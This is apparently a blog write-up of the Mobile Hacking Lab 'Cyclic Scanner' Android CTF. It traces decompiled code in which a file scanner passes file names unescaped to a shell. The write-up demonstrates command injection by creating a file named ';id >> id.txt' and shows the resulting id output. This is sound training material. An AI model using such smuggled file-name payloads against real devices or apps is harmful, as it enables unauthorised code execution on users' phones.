---
date: '2025-03-30T12:42:08+08:00'
title: 'MHL Cyclic Scanner'
tags:
    - MHL
    - Android CTF
---

## Challenge Description

> Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.
>
> [cyclicscanner.apk](static/cyclicscanner.apk)

## Solution

I started by performing static analysis to get an understanding on what the application is doing.

### Static Analysis 

I started out by looking into the `AndroidManifest.xml` after decompiling using `jadx-gui`. 

```xml
<activity
    android:name="com.mobilehackinglab.cyclicscanner.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<service
    android:name="com.mobilehackinglab.cyclicscanner.scanner.ScanService"
    android:exported="false"/>
```

I noticed that there's a service named `ScanService` and it is not exported. I started out by reading the `MainActivity` code.

```java
public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) {
    Intrinsics.checkNotNullParameter(this$0, "this$0");
    if (isChecked) {
        Toast.makeText(this$0, "Scan service started, your device will be scanned regularly.", 0).show();
        this$0.startForegroundService(new Intent(this$0, (Class<?>) ScanService.class));
        return;
    }
    Toast.makeText(this$0, "Scan service cannot be stopped, this is for your own safety!", 0).show();
    ActivityMainBinding activityMainBinding = this$0.binding;
    if (activityMainBinding == null) {
        Intrinsics.throwUninitializedPropertyAccessException("binding");
        activityMainBinding = null;
    }
    activityMainBinding.serviceSwitch.setChecked(true);
}
```

According to this function in `MainActivity`, it will start `ScanService` service after some checks.

```java
@Override // android.os.Handler
public void handleMessage(Message msg) {
    Intrinsics.checkNotNullParameter(msg, "msg");
    try {
        System.out.println((Object) "starting file scan...");
        File externalStorageDirectory = Environment.getExternalStorageDirectory();
        Intrinsics.checkNotNullExpressionValue(externalStorageDirectory, "getExternalStorageDirectory(...)");
        Sequence $this$forEach$iv = FilesKt.walk$default(externalStorageDirectory, null, 1, null);
        for (Object element$iv : $this$forEach$iv) {
            File file = (File) element$iv;
            if (file.canRead() && file.isFile()) {
                System.out.print((Object) (file.getAbsolutePath() + "..."));
                boolean safe = ScanEngine.INSTANCE.scanFile(file);
                System.out.println((Object) (safe ? "SAFE" : "INFECTED"));
            }
        }
        System.out.println((Object) "finished file scan!");
    } catch (InterruptedException e) {
        Thread.currentThread().interrupt();
    }
    Message $this$handleMessage_u24lambda_u241 = obtainMessage();
    $this$handleMessage_u24lambda_u241.arg1 = msg.arg1;
    sendMessageDelayed($this$handleMessage_u24lambda_u241, ScanService.SCAN_INTERVAL);
}
```

In the `ScanService`, it will trigger this `handleMessage` function after the `onStartCommand` function send message succesfully. In the `handleMessage`, it will get externals storage directory using `Environment.getExternalStorageDirectory()` and it will go through a for loop to get every files. Each of the files will go through this `ScanEngine.INSTANCE.scanFile`. 

```java
public final boolean scanFile(File file) {
    Intrinsics.checkNotNullParameter(file, "file");
    try {
        String command = "toybox sha1sum " + file.getAbsolutePath();
        Process process = new ProcessBuilder(new String[0]).command("sh", "-c", command).directory(Environment.getExternalStorageDirectory()).redirectErrorStream(true).start();
        InputStream inputStream = process.getInputStream();
        Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
        Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
        BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
        try {
            BufferedReader reader = bufferedReader;
            String output = reader.readLine();
            Intrinsics.checkNotNull(output);
            Object fileHash = StringsKt.substringBefore$default(output, "  ", (String) null, 2, (Object) null);
            Unit unit = Unit.INSTANCE;
            Closeable.closeFinally(bufferedReader, null);
            return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash);
        } finally {
        }
    } catch (Exception e) {
        e.printStackTrace();
        return false;
    }
}
```

In the `ScanEngine.INSTANCE.scanFile` function, it is running bash command by using `"toybox sha1sum" + file.getAbsolutePath()` and it will pass to `command("sh", "-c", command)`. Looking into the code, it seems like it do not have any input validation or sanitization which mean I could perform RCE if I can just add a file with specific name in the external storage directory. 

### Dynamic Analysis 

After having a basic understanding from static analysis, I tried to play around with it and see how it works. 

![alt text](img/index.png#center)

Here's the `MainActivity` where it has a button to enable the scanner. After clicking it, it only have a simple toast.

![alt text](img/index-1.png#center)

After enabling it, look into the logcat.

```poewershell
PS C:\Users\kskin> adb logcat System.out:I --pid=9717
...
03-30 14:13:26.867  9717 10171 I System.out: /storage/emulated/0/Download/cacert.der...SAFE
03-30 14:13:26.898  9717 10171 I System.out: /storage/emulated/0/Music/.thumbnails/.database_uuid...SAFE
...
```

Basically, it will go through a bunch of files from several directories such as `Download` and `Music`. I then tried to write a file with malicious name to perform RCE.

```bash
1|beryllium:/sdcard/Download # echo '' > ';id >> id.txt'
1|beryllium:/sdcard/Download # ls -la
total 24
-rw-rw---- 1 root everybody    1 2025-03-30 14:18 ;id\ >>\ id.txt
```

After that, just wait for the result from logcat and see if it works. 

```powershell
03-30 14:21:22.927  9717 10171 I System.out: /storage/emulated/0/Download/;id >> id.txt...SAFE
03-30 14:21:23.040  9717 10171 I System.out: /storage/emulated/0/id.txt...SAFE
```

In the logcat, It managed to perform RCE and created another file named `id.txt`. 

```bash
beryllium:/sdcard # ls -la id.txt
-rw-rw---- 1 root everybody 1176 2025-03-30 14:22 id.txt
beryllium:/sdcard # cat id.txt
uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768
uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768
uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768
uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768
uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768
uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768
```

According to the result, it can easily know that the code is vulnerable to RCE. 

## Things I learned from this challenge

- `adb logcat` to read the specific log
- RCE in android 
- code reading